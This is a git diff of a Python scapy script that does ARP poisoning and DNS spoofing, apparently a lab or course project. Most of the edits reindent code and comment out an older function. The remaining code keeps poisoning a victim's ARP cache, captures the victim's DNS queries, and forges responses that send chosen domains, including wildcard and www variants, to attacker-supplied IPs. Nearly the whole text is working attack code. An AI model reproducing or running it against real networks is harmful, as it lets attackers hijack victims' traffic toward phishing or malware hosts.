@@ -15,21 +15,20 @@ def getDnsMsg(hwA,hwV,ipV,ipG,urlsToSpoof):
     arpPoison(hwA,hwV,ipV,ipG)
 
     while(True):
-	toc = time.time()
-	if toc-tic > 0.2:
-	    tic = toc
-	    arpPoison(hwA,hwV,ipV,ipG)
-	    print("-------------------ARP poisoning")
+        toc = time.time()
+        if toc-tic > 0.2:
+            tic = toc
+            arpPoison(hwA,hwV,ipV,ipG)
+            print("-------------------ARP poisoning")
 	
         pkt = sniff(count=1,iface="enp0s9",filter="udp port 53")[0]
-	print("black fucking magic")
 
         if pkt.haslayer(DNS):
             dnsQueryFromVictim, goodUrl = getDnsMsgType(pkt,ipV,urlsToSpoof)
-	    print("packet found")
+            print("packet found")
             return (pkt, dnsQueryFromVictim, goodUrl)
-	else:
-	    print("done")
+        else:
+            print("bad packet")
     
     
 def getDnsMsgType(pkt,ipV,urlsToSpoof):
@@ -44,24 +43,24 @@ def getDnsMsgType(pkt,ipV,urlsToSpoof):
     else: 
         return (False, False)
 
-def dnsSpoofVictimQuery(pkt,goodUrl):
+# def dnsSpoofVictimQuery(pkt,goodUrl):
 
-    pkt.show()
+#     pkt.show()
 
-    return
+#     return
 
-def dnsPoisoningBad(urlsToSpoof):
+# def dnsPoisoningBad(urlsToSpoof):
 
-    print("\nDNS poisoning attack\n")
+#     print("\nDNS poisoning attack\n")
 
-    ipVictim = raw_input("Victim IP address: ")
+#     ipVictim = raw_input("Victim IP address: ")
 
-    (pkt,dnsQueryFromVictim,goodUrl) = getDnsMsg(ipVictim,urlsToSpoof)
+#     (pkt,dnsQueryFromVictim,goodUrl) = getDnsMsg(ipVictim,urlsToSpoof)
     
-    if dnsQueryFromVictim:
-        dnsSpoofVictimQuery(pkt,goodUrl)
-    else:
-        pass
+#     if dnsQueryFromVictim:
+#         dnsSpoofVictimQuery(pkt,goodUrl)
+#     else:
+#         pass
 
     return
 
@@ -81,9 +80,9 @@ def dnsPoisoning(urlsToSpoof):
 
     if dnsQueryFromVictim and goodUrl:
 	
-	dnsResponse = dnsForgeResponse(pkt, urlsToSpoof)
-	dnsResponse.show()
-	sendp(dnsResponse, iface=interface)
+        dnsResponse = dnsForgeResponse(pkt, urlsToSpoof)
+        dnsResponse.show()
+        sendp(dnsResponse, iface=interface)
 
     return
 
@@ -92,10 +91,10 @@ def dnsForgeResponse(pkt, urlsToSpoof):
     urlRequested = pkt[DNS].qd.qname
 
     if urlsToSpoof:
-	ipA = urlsToSpoof[urlRequested]
+        ipA = urlsToSpoof[urlRequested]
 
     else:
-	ipA = "10.0.2.4"
+        ipA = "10.0.2.4"
 
     eth = Ether(
 	src = pkt[Ether].dst, 
@@ -138,9 +137,10 @@ def showUrlsToSpoof(urlsToSpoof):
     print("URLs to spoof:")
     
     for url in urlsToSpoof.keys():
-	print(url)
+        print(url)
 
     print("")
+    return
 
 def inputUrlsToSpoof(urlsToSpoof):
 
@@ -149,33 +149,33 @@ def inputUrlsToSpoof(urlsToSpoof):
 
     def addUrls(urlsToSpoof):
 	
-	urlsToSpoof[user_in] = user_in_2
-	urlsToSpoof["*." + user_in] = user_in_2
-	urlsToSpoof["www." + user_in] = user_in_2
+        urlsToSpoof[user_in] = user_in_2
+        urlsToSpoof["*." + user_in] = user_in_2
+        urlsToSpoof["www." + user_in] = user_in_2
 
         return urlsToSpoof
     
     while(True):
-	user_in = raw_input("URL to spoof: ")
+        user_in = raw_input("URL to spoof: ")
         user_in_split = user_in.split(".")
     
         if user_in == "c":
             return urlsToSpoof
     
         elif len(user_in_split) == 2:
-	    user_in_2 = raw_input("IP to use: ")
-	    urlsToSpoof = addUrls(urlsToSpoof)
+            user_in_2 = raw_input("IP to use: ")
+            urlsToSpoof = addUrls(urlsToSpoof)
 
         elif len(user_in_split) == 3:
-	    user_in_2 = raw_input("IP to use: ")
+            user_in_2 = raw_input("IP to use: ")
 
-	    if user_in_split[0] in ("*.", "www"):
-	        del user_in_split[0]
-	        user_in = ".".join(user_in_split)
-	        urlsToSpoof = addUrls(urlsToSpoof)
+            if user_in_split[0] in ("*.", "www"):
+                del user_in_split[0]
+                user_in = ".".join(user_in_split)
+                urlsToSpoof = addUrls(urlsToSpoof)
 	
-	    else:
-	        urlsToSpoof[user_in] = user_in_2
-    
+            else:
+                urlsToSpoof[user_in] = user_in_2
+        
         else:
-	    print("Error: bad input \"" + str(user_in) + "\"")
+            print("Error: bad input \"" + str(user_in) + "\"")
